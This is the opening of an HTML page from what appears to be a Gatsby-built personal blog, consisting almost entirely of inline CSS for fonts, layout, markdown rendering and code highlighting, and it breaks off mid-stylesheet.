<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.f0f69b0fea852e43ed02.css" data-identity="gatsby-global-css">@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:100;src:local("Montserrat Thin "),local("Montserrat-Thin"),url(/static/montserrat-latin-100-8d7d79679b70dbe27172b6460e7a7910.woff2) format("woff2"),url(/static/montserrat-latin-100-ec38980a9e0119a379e2a9b3dbb1901a.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:100;src:local("Montserrat Thin italic"),local("Montserrat-Thinitalic"),url(/static/montserrat-latin-100italic-e279051046ba1286706adc886cf1c96b.woff2) format("woff2"),url(/static/montserrat-latin-100italic-3b325a3173c8207435cd1b76e19bf501.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:200;src:local("Montserrat Extra Light "),local("Montserrat-Extra Light"),url(/static/montserrat-latin-200-9d266fbbfa6cab7009bd56003b1eeb67.woff2) format("woff2"),url(/static/montserrat-latin-200-2d8ba08717110d27122e54c34b8a5798.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:200;src:local("Montserrat Extra Light italic"),local("Montserrat-Extra Lightitalic"),url(/static/montserrat-latin-200italic-6e5b3756583bb2263eb062eae992735e.woff2) format("woff2"),url(/static/montserrat-latin-200italic-a0d6f343e4b536c582926255367a57da.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:300;src:local("Montserrat Light "),local("Montserrat-Light"),url(/static/montserrat-latin-300-00b3e893aab5a8fd632d6342eb72551a.woff2) format("woff2"),url(/static/montserrat-latin-300-ea303695ceab35f17e7d062f30e0173b.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:300;src:local("Montserrat Light italic"),local("Montserrat-Lightitalic"),url(/static/montserrat-latin-300italic-56f34ea368f6aedf89583d444bbcb227.woff2) format("woff2"),url(/static/montserrat-latin-300italic-54b0bf2c8c4c12ffafd803be2466a790.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:400;src:local("Montserrat Regular "),local("Montserrat-Regular"),url(/static/montserrat-latin-400-b71748ae4f80ec8c014def4c5fa8688b.woff2) format("woff2"),url(/static/montserrat-latin-400-0659a9f4e90db5cf51b50d005bff1e41.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:400;src:local("Montserrat Regular italic"),local("Montserrat-Regularitalic"),url(/static/montserrat-latin-400italic-6eed6b4cbb809c6efc7aa7ddad6dbe3e.woff2) format("woff2"),url(/static/montserrat-latin-400italic-7583622cfde30ae49086d18447ab28e7.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:500;src:local("Montserrat Medium "),local("Montserrat-Medium"),url(/static/montserrat-latin-500-091b209546e16313fd4f4fc36090c757.woff2) format("woff2"),url(/static/montserrat-latin-500-edd311588712a96bbf435fad264fff62.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:500;src:local("Montserrat Medium italic"),local("Montserrat-Mediumitalic"),url(/static/montserrat-latin-500italic-c90ced68b46050061d1a41842d6dfb43.woff2) format("woff2"),url(/static/montserrat-latin-500italic-5146cbfe02b1deea5dffea27a5f2f998.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:600;src:local("Montserrat SemiBold "),local("Montserrat-SemiBold"),url(/static/montserrat-latin-600-0480d2f8a71f38db8633b84d8722e0c2.woff2) format("woff2"),url(/static/montserrat-latin-600-b77863a375260a05dd13f86a1cee598f.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:600;src:local("Montserrat SemiBold italic"),local("Montserrat-SemiBolditalic"),url(/static/montserrat-latin-600italic-cf46ffb11f3a60d7df0567f8851a1d00.woff2) format("woff2"),url(/static/montserrat-latin-600italic-c4fcfeeb057724724097167e57bd7801.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:700;src:local("Montserrat Bold "),local("Montserrat-Bold"),url(/static/montserrat-latin-700-7dbcc8a5ea2289d83f657c25b4be6193.woff2) format("woff2"),url(/static/montserrat-latin-700-99271a835e1cae8c76ef8bba99a8cc4e.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:700;src:local("Montserrat Bold italic"),local("Montserrat-Bolditalic"),url(/static/montserrat-latin-700italic-c41ad6bdb4bd504a843d546d0a47958d.woff2) format("woff2"),url(/static/montserrat-latin-700italic-6779372f04095051c62ed36bc1dcc142.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:800;src:local("Montserrat ExtraBold "),local("Montserrat-ExtraBold"),url(/static/montserrat-latin-800-db9a3e0ba7eaea32e5f55328ace6cf23.woff2) format("woff2"),url(/static/montserrat-latin-800-4e3c615967a2360f5db87d2f0fd2456f.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:800;src:local("Montserrat ExtraBold italic"),local("Montserrat-ExtraBolditalic"),url(/static/montserrat-latin-800italic-bf45bfa14805969eda318973947bc42b.woff2) format("woff2"),url(/static/montserrat-latin-800italic-fe82abb0bcede51bf724254878e0c374.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:900;src:local("Montserrat Black "),local("Montserrat-Black"),url(/static/montserrat-latin-900-e66c7edc609e24bacbb705175669d814.woff2) format("woff2"),url(/static/montserrat-latin-900-8211f418baeb8ec880b80ba3c682f957.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:900;src:local("Montserrat Black italic"),local("Montserrat-Blackitalic"),url(/static/montserrat-latin-900italic-4454c775e48152c1a72510ceed3603e2.woff2) format("woff2"),url(/static/montserrat-latin-900italic-efcaa0f6a82ee0640b83a0916e6e8d68.woff) format("woff")}.search-input-wrapper{align-items:center;display:none;margin-top:3px;width:180px}@media(min-width:768px){.search-input-wrapper{display:flex}}.search-icon{color:var(--primary-text-color);margin-right:2px}.search-input{height:100%;width:100%}.search-input .MuiAutocomplete-inputRoot{padding-right:0!important}.search-input .MuiInputBase-input{color:var(--primary-text-color)!important;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;font-weight:500;padding-bottom:2px!important}.search-input .MuiInput-underline:before{border-bottom-width:1px}.search-input .MuiInput-underline:after,.search-input .MuiInput-underline:before{border-bottom-color:var(--primary-text-color)}.page-header-wrapper{display:flex;height:60px;justify-content:center;width:100%}.page-header-wrapper .page-header{align-items:center;display:flex;justify-content:space-between;max-width:720px;width:100%}.page-header-wrapper .page-header .link{color:var(--primary-text-color);font-size:17px;font-weight:700}@media(min-width:768px){.page-header-wrapper .page-header .link{font-size:20px;font-weight:700}}.page-header-wrapper .page-header .trailing-section{align-items:center;display:flex}.page-header-wrapper .page-header .trailing-section .link{margin-right:10px}@media(min-width:768px){.page-header-wrapper .page-header .trailing-section .link{margin-right:20px}}.page-footer-wrapper{align-items:center;display:flex;height:62px;justify-content:center;margin-top:auto;width:100%}.page-footer-wrapper .page-footer{max-width:720px;text-align:center;width:100%}.page-footer-wrapper .page-footer .link{color:var(--primary-text-color);font-size:20px;font-weight:700;margin-right:20px}.page-footer-wrapper .page-footer a{color:#3a95ff}.dark-mode-button-wrapper{align-items:center;bottom:20px;display:flex;justify-content:center;position:fixed;right:20px}.dark-mode-button{-webkit-backdrop-filter:blur(30px);backdrop-filter:blur(30px);background-color:#363f47!important;border-radius:50px;box-shadow:0 5px 25px rgba(0,0,0,.12);cursor:pointer;height:50px;width:50px;z-index:3}.dark-mode-icon{color:#fff}a,abbr,acronym,address,applet,article,aside,audio,b,big,blockquote,body,canvas,caption,center,cite,code,dd,del,details,dfn,div,dl,dt,em,embed,fieldset,figcaption,figure,footer,form,h1,h2,h3,h4,h5,h6,header,hgroup,html,i,iframe,img,ins,kbd,label,legend,li,mark,menu,nav,object,ol,output,p,pre,q,ruby,s,samp,section,small,span,strike,strong,sub,summary,sup,table,tbody,td,tfoot,th,thead,time,tr,tt,u,ul,var,video{border:0;font-size:100%;font:inherit;margin:0;padding:0;vertical-align:baseline}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-height:1}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:after,blockquote:before,q:after,q:before{content:"";content:none}table{border-collapse:collapse;border-spacing:0}a{outline:none;text-decoration:none}html{--background-color:#fff;--primary-text-color:#000;--secondary-text-color:#9e9e9e;--content-text-color:#37352f;--button-background-color:#f3f3f4;--button-text-color:#363f47;--tab-text-color:#6e6d7a;--tab-hover-text-color:#0d0c22;--tab-selected-background-color:rgba(13,12,34,.05);--bio-link-icon-color:rgba(0,0,0,.54);--about-link-icon-color:#a8a8a8;--chip-background-color:#f3f3f4;--link-text-color:rgba(55,53,47,.7);--post-card-border-color:rgba(0,0,0,.12);--markdown-table-even-cell-background-color:#f6f8fa;--markdown-table-border-color:#dfe2e5;--markdown-blockquote-border-color:#dfe2e5;--markdown-border-color:#e1e4e8}html[data-theme=dark]{--background-color:#232326;--primary-text-color:#e6e6e6;--secondary-text-color:#768390;--content-text-color:#e6e6e6;--button-background-color:#444c56;--button-text-color:#363f47;--tab-text-color:#768390;--tab-hover-text-color:#acbac7;--tab-selected-background-color:#373e47;--chip-background-color:#323a42;--bio-link-icon-color:#e6e6e6;--about-link-icon-color:#a8a8a8;--link-text-color:#90b0ec;--post-card-border-color:#363f47;--markdown-table-even-cell-background-color:#2d333b;--markdown-table-border-color:#444c56;--markdown-blockquote-border-color:#4f5864;--markdown-border-color:#e1e4e8}*{-webkit-appearance:none;appearance:none;box-sizing:border-box}html{font-size:14px;height:100%;overflow-y:scroll;width:100%}body{background-color:var(--background-color)!important}a{color:var(--link-text-color)}.page-wrapper{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;color:var(--primary-text-color);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;justify-content:center;min-height:100vh;padding-left:15px;padding-right:15px;word-break:keep-all}.page-wrapper,.page-wrapper .page-content{align-items:center;display:flex;flex-direction:column;width:100%}.page-wrapper .page-content{max-width:720px}.icon{color:var(--about-link-icon-color);font-size:20px}.social-links .icon{color:var(--bio-link-icon-color);font-size:30px}@-webkit-keyframes blinking-cursor{0%{opacity:0}50%{opacity:1}to{opacity:0}}@keyframes blinking-cursor{0%{opacity:0}50%{opacity:1}to{opacity:0}}.bio{color:var(--primary-text-color);display:flex;flex-direction:column;justify-content:space-between;margin-bottom:120px;margin-top:120px;width:100%}@media(min-width:768px){.bio{align-items:center;flex-direction:row}}.bio .introduction{display:flex;flex-direction:column;word-break:keep-all}.bio .introduction .react-rotating-text-cursor{-webkit-animation:blinking-cursor .8s cubic-bezier(.68,.01,.01,.99) 0s infinite;animation:blinking-cursor .8s cubic-bezier(.68,.01,.01,.99) 0s infinite}.bio .introduction strong{display:inline-block;font-weight:600}.bio .introduction.korean{font-size:32px;font-weight:100;line-height:1.2}.bio .introduction.korean .title .react-rotating-text-cursor{font-size:35px;line-height:35px}@media(min-width:768px){.bio .introduction.korean{font-size:40px}.bio .introduction.korean .title .react-rotating-text-cursor{font-size:45px;line-height:45px}}.bio .introduction.english{font-family:montserrat;font-size:25px;line-height:1.2}@media(min-width:768px){.bio .introduction.english{font-size:45px}}.bio .introduction.english .name{font-size:35px;font-weight:600}.bio .introduction.english .job{font-size:35px}.bio .introduction.english .description{font-size:20px;font-weight:200;margin-top:8px}.bio .introduction.english .social-links{display:flex;margin-top:20px}.bio .thumbnail{display:none;width:250px}@media(min-width:768px){.bio .thumbnail{display:block}}.section-header-wrapper{display:flex;justify-content:center;margin-bottom:32px;width:100%}.section-header-wrapper .section-header{border-bottom:4px solid var(--primary-text-color);color:var(--primary-text-color);font-size:30px;font-weight:700;padding-bottom:5px}.timestamp-section{align-items:center;display:flex;flex-direction:column;justify-content:center;margin-bottom:50px;width:100%;word-break:keep-all}.timestamp-section .body{padding:0 10px;width:100%}.timestamp-section .body .timestamp{border-left:2px solid #bdbdbd;display:flex;font-size:18px;font-weight:400;justify-items:center;margin-left:5px;padding:10px 0;width:100%}.timestamp-section .body .timestamp:first-child{padding-top:7px}.timestamp-section .body .timestamp:last-child{padding-bottom:7px}.timestamp-section .body .timestamp:before{align-self:center;background-color:var(--background-color);border:2px solid #828282;border-radius:10px;content:"";height:10px;left:-1px;position:relative;-webkit-transform:translatex(-50%);transform:translatex(-50%);width:10px}.timestamp-section .body .timestamp .date{align-self:center;color:#828282;margin-left:5px;margin-right:5px;min-width:115px;width:115px}@media(min-width:768px){.timestamp-section .body .timestamp .date{min-width:200px;width:200px}}.timestamp-section .body .timestamp .activity{line-height:23px;width:100%}.project-section{align-items:center;justify-content:center}.project-section,.project-section .project{display:flex;flex-direction:column;width:100%}.project-section .project{margin-bottom:30px;padding:15px}.project-section .project .head{font-size:20px;font-weight:700;line-height:30px;margin-bottom:10px}.project-section .project .body{display:flex;flex-direction:column;width:100%}.project-section .project .body .thumbnail{margin-bottom:10px;width:100%}.project-section .project .body .tech-stack{display:flex;margin-bottom:10px}.project-section .project .body .tech-stack .tech{background-color:var(--chip-background-color);border-radius:10px;font-size:15px;font-weight:500;margin-right:5px;padding:5px 7px}.project-section .project .body .description{font-size:16px;font-weight:400;line-height:1.4}@media(min-width:768px){.project-section .project .body{flex-direction:column}.project-section .project .body .content{margin-top:0}}.post-header{border-bottom:1px solid var(--post-card-border-color);display:flex;flex-direction:column;justify-content:center;margin-bottom:40px;margin-top:20px;padding-bottom:10px;width:100%;word-break:keep-all}.post-header .emoji{font-size:78px;margin-bottom:20px}.post-header .categories{margin-bottom:5px}.post-header .categories .category{color:var(--primary-text-color);font-weight:600;margin-right:4px}.post-header .categories .category:hover{text-decoration:underline}.post-header .title{color:var(--primary-text-color);font-size:32px;font-weight:600;line-height:1.3;margin-bottom:6px}.post-header .info{color:var(--secondary-text-color);display:flex;flex-wrap:wrap;font-size:16px;font-weight:500;line-height:1.5;width:100%}.post-header .info .author{margin-right:4px}.post-header .info strong{color:var(--primary-text-color);font-weight:600}.post-navigator{-webkit-column-gap:1.4%;column-gap:1.4%;display:grid;grid-template-columns:49.3% 49.3%;width:100%}.post-navigator .post-card{border:1px solid var(--post-card-border-color);border-radius:6px;color:var(--primary-text-color);cursor:pointer;display:flex;flex-direction:column;padding:15px;transition:-webkit-transform .2s;transition:transform .2s;transition:transform .2s,-webkit-transform .2s;width:100%}.post-navigator .post-card:hover .title{text-decoration:underline}.post-navigator .post-card.prev{margin-right:auto}.post-navigator .post-card.next{margin-left:auto}.post-navigator .post-card .direction{color:gray;font-size:14px;font-weight:500;margin-bottom:5px}.post-navigator .post-card .title{font-size:16px;font-weight:600;line-height:1.4;margin-bottom:7px}.markdown .octicon{fill:currentColor;display:inline-block;vertical-align:text-bottom}.markdown .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown .anchor:focus{outline:none}.markdown h1 .octicon-link,.markdown h2 .octicon-link,.markdown h3 .octicon-link,.markdown h4 .octicon-link,.markdown h5 .octicon-link,.markdown h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown h1:hover .anchor,.markdown h2:hover .anchor,.markdown h3:hover .anchor,.markdown h4:hover .anchor,.markdown h5:hover .anchor,.markdown h6:hover .anchor{text-decoration:none}.markdown h1:hover .anchor .octicon-link,.markdown h2:hover .anchor .octicon-link,.markdown h3:hover .anchor .octicon-link,.markdown h4:hover .anchor .octicon-link,.markdown h5:hover .anchor .octicon-link,.markdown h6:hover .anchor .octicon-link{visibility:visible}.markdown h1:hover .anchor .octicon-link:before,.markdown h2:hover .anchor .octicon-link:before,.markdown h3:hover .anchor .octicon-link:before,.markdown h4:hover .anchor .octicon-link:before,.markdown h5:hover .anchor .octicon-link:before,.markdown h6:hover .anchor .octicon-link:before{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true' viewBox='0 0 16 16'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E");content:" ";display:inline-block;height:16px;width:16px}.markdown{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;word-wrap:break-word;color:var(--content-text-color);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;font-weight:500;line-height:1.5}.markdown details{display:block}.markdown summary{display:list-item}.markdown a{background-color:initial}.markdown a:active,.markdown a:hover{outline-width:0}.markdown strong{font-weight:inherit;font-weight:bolder}.markdown h1{margin:.67em 0}.markdown img{border-style:none}.markdown code,.markdown kbd,.markdown pre{font-family:monospace,monospace;font-size:1em}.markdown hr{box-sizing:initial;overflow:visible}.markdown input{font:inherit;margin:0;overflow:visible}.markdown [type=checkbox]{box-sizing:border-box;padding:0}.markdown *{box-sizing:border-box}.markdown input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown a{border-bottom:.05em solid;border-color:var(--link-text-color);color:var(--link-text-color);text-decoration:none}.markdown a.anchor{border-bottom:none}.markdown strong{font-weight:700}.markdown hr{background:transparent;border-bottom:1px solid var(--markdown-blockquote-border-color);height:0;margin:15px 0;overflow:hidden}.markdown hr:after,.markdown hr:before{content:"";display:table}.markdown hr:after{clear:both}.markdown table{border-collapse:collapse;border-spacing:0}.markdown td,.markdown th{padding:0}.markdown details summary{cursor:pointer}.markdown h1,.markdown h2,.markdown h3,.markdown h4,.markdown h5,.markdown h6{margin-bottom:0;margin-top:0}.markdown h1{font-size:32px}.markdown h1,.markdown h2{font-weight:600}.markdown h2{font-size:24px}.markdown h3{font-size:20px}.markdown h3,.markdown h4{font-weight:600}.markdown h4{font-size:16px}.markdown h5{font-size:14px}.markdown h5,.markdown h6{font-weight:600}.markdown h6{font-size:12px}.markdown p{margin-bottom:10px;margin-top:0}.markdown blockquote{margin:0}.markdown ol,.markdown ul{margin-bottom:0;margin-top:0;padding-left:0}.markdown ol ol,.markdown ul ol{list-style-type:lower-roman}.markdown ol ol ol,.markdown ol ul ol,.markdown ul ol ol,.markdown ul ul ol{list-style-type:lower-alpha}.markdown dd{margin-left:0}.markdown code,.markdown pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown code.language-text{border-radius:3px;font-size:85%;padding:.2em .4em}.markdown :not(pre)>code.language-text{background:hsla(44,6%,50%,.15);color:#eb5757;overflow-wrap:break-word}.markdown pre{margin-bottom:0;margin-top:0}.markdown input::-webkit-inner-spin-button,.markdown input::-webkit-outer-spin-button{-webkit-appearance:none;appearance:none;margin:0}.markdown :checked+.radio-label{border-color:#0366d6;position:relative;z-index:1}.markdown .border{border:1px solid var(--markdown-border-color)!important}.markdown .border-0{border:0!important}.markdown .border-bottom{border-bottom:1px solid var(--markdown-border-color)!important}.markdown .rounded-1{border-radius:3px!important}.markdown .bg-white{background-color:transparent!important}.markdown .bg-gray-light{background-color:#fafbfc!important}.markdown .text-gray-light{color:#6a737d!important}.markdown .pl-3,.markdown .px-3{padding-left:16px!important}.markdown .px-3{padding-right:16px!important}.markdown .f6{font-size:12px!important}.markdown .lh-condensed{line-height:1.25!important}.markdown .text-bold{font-weight:600!important}.markdown .pl-c{color:#6a737d}.markdown .pl-c1,.markdown .pl-s .pl-v{color:#005cc5}.markdown .pl-e,.markdown .pl-en{color:#6f42c1}.markdown .pl-s .pl-s1,.markdown .pl-smi{color:#24292e}.markdown .pl-ent{color:#22863a}.markdown .pl-k{color:#d73a49}.markdown .pl-pds,.markdown .pl-s,.markdown .pl-s .pl-pse .pl-s1,.markdown .pl-sr,.markdown .pl-sr .pl-cce,.markdown .pl-sr .pl-sra,.markdown .pl-sr .pl-sre{color:#032f62}.markdown .pl-smw,.markdown .pl-v{color:#e36209}.markdown .pl-bu{color:#b31d28}.markdown .pl-ii{background-color:#b31d28;color:#fafbfc}.markdown .pl-c2{background-color:#d73a49;color:#fafbfc}.markdown .pl-c2:before{content:"^M"}.markdown .pl-sr .pl-cce{color:#22863a;font-weight:700}.markdown .pl-ml{color:#735c0f}.markdown .pl-mh,.markdown .pl-mh .pl-en,.markdown .pl-ms{color:#005cc5;font-weight:700}.markdown .pl-mi{color:#24292e;font-style:italic}.markdown .pl-mb{color:#24292e;font-weight:700}.markdown .pl-md{background-color:#ffeef0;color:#b31d28}.markdown .pl-mi1{background-color:#f0fff4;color:#22863a}.markdown .pl-mc{background-color:#ffebda;color:#e36209}.markdown .pl-mi2{background-color:#005cc5;color:#f6f8fa}.markdown .pl-mdr{color:#6f42c1;font-weight:700}.markdown .pl-ba{color:#586069}.markdown .pl-sg{color:#959da5}.markdown .pl-corl{color:#032f62;text-decoration:underline}.markdown .mb-0{margin-bottom:0!important}.markdown .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown .pl-0{padding-left:0!important}.markdown .py-0{padding-bottom:0!important;padding-top:0!important}.markdown .pl-1{padding-left:4px!important}.markdown .pl-2{padding-left:8px!important}.markdown .py-2{padding-bottom:8px!important;padding-top:8px!important}.markdown .pl-3{padding-left:16px!important}.markdown .pl-4{padding-left:24px!important}.markdown .pl-5{padding-left:32px!important}.markdown .pl-6{padding-left:40px!important}.markdown .pl-7{padding-left:48px!important}.markdown .pl-8{padding-left:64px!important}.markdown .pl-9{padding-left:80px!important}.markdown .pl-10{padding-left:96px!important}.markdown .pl-11{padding-left:112px!important}.markdown .pl-12{padding-left:128px!important}.markdown hr{border-bottom-color:#eee}.markdown kbd{background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da;color:#444d56;display:inline-block;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;padding:3px 5px;vertical-align:middle}.markdown:after,.markdown:before{content:"";display:table}.markdown:after{clear:both}.markdown>:first-child{margin-top:0!important}.markdown>:last-child{margin-bottom:0!important}.markdown a:not([href]){color:inherit;text-decoration:none}.markdown blockquote,.markdown details,.markdown dl,.markdown ol,.markdown p,.markdown pre,.markdown table,.markdown ul{margin-bottom:16px;margin-top:0}.markdown hr{background-color:var(--markdown-border-color);border:0;height:.25em;margin:24px 0;padding:0}.markdown blockquote{border-left:.25em solid var(--markdown-blockquote-border-color);color:#6a737d;padding:0 1em}.markdown blockquote>:first-child{margin-top:0}.markdown blockquote>:last-child{margin-bottom:0}.markdown h1,.markdown h2,.markdown h3,.markdown h4,.markdown h5,.markdown h6{font-weight:600;line-height:1.25;margin-bottom:16px;margin-top:24px}.markdown h1{font-size:2em}.markdown h2{font-size:1.5em}.markdown h3{font-size:1.25em}.markdown h4{font-size:1em}.markdown h5{font-size:.875em}.markdown h6{color:#6a737d;font-size:.85em}.markdown ol,.markdown ul{padding-left:2em}.markdown ol ol,.markdown ol ul,.markdown ul ol,.markdown ul ul{margin-bottom:0;margin-top:0}.markdown ol{list-style-type:decimal}.markdown ul{list-style-type:disc}.markdown li{word-wrap:break-all;display:list-item;text-align:-webkit-match-parent}.markdown li>p{margin-top:16px}.markdown li+li{margin-top:.25em}.markdown dl{padding:0}.markdown dl dt{font-size:1em;font-style:italic;font-weight:600;margin-top:16px;padding:0}.markdown dl dd{margin-bottom:16px;padding:0 16px}.markdown table{display:block;overflow:auto;width:100%}.markdown table th{font-weight:600}.markdown table td,.markdown table th{border:1px solid var(--markdown-table-border-color);padding:6px 13px}.markdown table tr{border-top:1px solid var(--markdown-table-border-color)}.markdown table tr:nth-child(2n){background-color:var(--markdown-table-even-cell-background-color)}.markdown img{background-color:transparent;box-sizing:initial;display:block;margin:0 auto;max-width:100%}.markdown img[align=right]{padding-left:20px}.markdown img[align=left]{padding-right:20px}.markdown code{background-color:rgba(27,31,35,.05);border-radius:3px;font-size:85%;margin:0;padding:.2em .4em}.markdown pre{word-wrap:normal}.markdown pre>code{background:transparent;border:0;font-size:100%;margin:0;padding:0;white-space:pre;word-break:normal}.markdown .highlight{margin-bottom:16px}.markdown .highlight pre{margin-bottom:0;word-break:normal}.markdown .highlight pre,.markdown pre{background-color:#f6f8fa;border-radius:3px;font-size:85%;line-height:1.45;overflow:auto;padding:16px}.markdown pre code{word-wrap:normal;background-color:initial;border:0;display:inline;line-height:inherit;margin:0;max-width:auto;overflow:visible;padding:0}.markdown .commit-tease-sha{color:#444d56;display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%}.markdown .full-commit .btn-outline:not(:disabled):hover{border-color:#005cc5;color:#005cc5}.markdown .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown .blob-num{color:rgba(27,31,35,.3);cursor:pointer;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;min-width:50px;padding-left:10px;padding-right:10px;text-align:right;-webkit-user-select:none;user-select:none;vertical-align:top;white-space:nowrap;width:1%}.markdown .blob-num:hover{color:rgba(27,31,35,.6)}.markdown .blob-num:before{content:attr(data-line-number)}.markdown .blob-code{line-height:20px;padding-left:10px;padding-right:10px;position:relative;vertical-align:top}.markdown .blob-code-inner{word-wrap:normal;color:#24292e;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;overflow:visible;white-space:pre}.markdown .pl-token.active,.markdown .pl-token:hover{background:#ffea7f;cursor:pointer}.markdown .tab-size[data-tab-size="1"]{-o-tab-size:1;tab-size:1}.markdown .tab-size[data-tab-size="2"]{-o-tab-size:2;tab-size:2}.markdown .tab-size[data-tab-size="3"]{-o-tab-size:3;tab-size:3}.markdown .tab-size[data-tab-size="4"]{-o-tab-size:4;tab-size:4}.markdown .tab-size[data-tab-size="5"]{-o-tab-size:5;tab-size:5}.markdown .tab-size[data-tab-size="6"]{-o-tab-size:6;tab-size:6}.markdown .tab-size[data-tab-size="7"]{-o-tab-size:7;tab-size:7}.markdown .tab-size[data-tab-size="8"]{-o-tab-size:8;tab-size:8}.markdown .tab-size[data-tab-size="9"]{-o-tab-size:9;tab-size:9}.markdown .tab-size[data-tab-size="10"]{-o-tab-size:10;tab-size:10}.markdown .tab-size[data-tab-size="11"]{-o-tab-size:11;tab-size:11}.markdown .tab-size[data-tab-size="12"]{-o-tab-size:12;tab-size:12}.markdown .task-list-item{list-style-type:none}.markdown .task-list-item+.task-list-item{margin-top:3px}.markdown .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}.markdown .table-of-contents{align-items:flex-start;display:flex;flex-direction:column;justify-content:center;position:fixed;right:0;top:75px;width:340px}@media(max-width:1300px){.markdown .table-of-contents{display:none}}.markdown .table-of-contents ul{cursor:pointer;list-style-type:none}.markdown .table-of-contents ul li a{border-bottom:none;color:var(--secondary-text-color);font-size:14px;height:30px;padding:6px 2px;width:100%}.markdown .table-of-contents ul p{margin:0}.markdown .gatsby-resp-image-wrapper{display:flex!important;justify-content:center!important;max-height:560px!important;width:100%!important}.markdown .gatsby-resp-image-wrapper img{height:auto!important;max-height:560px!important;max-width:100%!important;position:relative!important;width:auto!important}.markdown .gatsby-resp-image-wrapper+em{color:#6a737d;display:block;font-size:15px;font-style:italic;text-align:center}code[class*=language-],pre[class*=language-]{word-wrap:normal;background:none;color:#ccc;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;-webkit-hyphens:none;hyphens:none;line-height:1.5;-o-tab-size:4;tab-size:4;text-align:left;white-space:pre;word-break:normal;word-spacing:normal}pre[class*=language-]{margin:.5em 0;overflow:auto;padding:1em}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{border-radius:.3em;padding:.1em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#999}.token.punctuation{color:#ccc}.token.attr-name,.token.deleted,.token.namespace,.token.tag{color:#e2777a}.token.function-name{color:#6196cc}.token.boolean,.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property,.token.symbol{color:#f8c555}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector{color:#cc99cd}.token.attr-value,.token.char,.token.regex,.token.string,.token.variable{color:#7ec699}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}.post-content{margin-bottom:20px;width:100%}.category-page-header-wrapper,.post-content{display:flex;flex-direction:column;justify-content:center}.category-page-header-wrapper{align-items:center;margin-bottom:30px;margin-top:30px}.category-page-header-wrapper .category-page-title{border-bottom:3px solid var(--primary-text-color);font-size:40px;font-weight:700;margin-bottom:15px;padding-bottom:7px;text-align:center;width:-webkit-fit-content;width:-moz-fit-content;width:fit-content}.category-page-header-wrapper 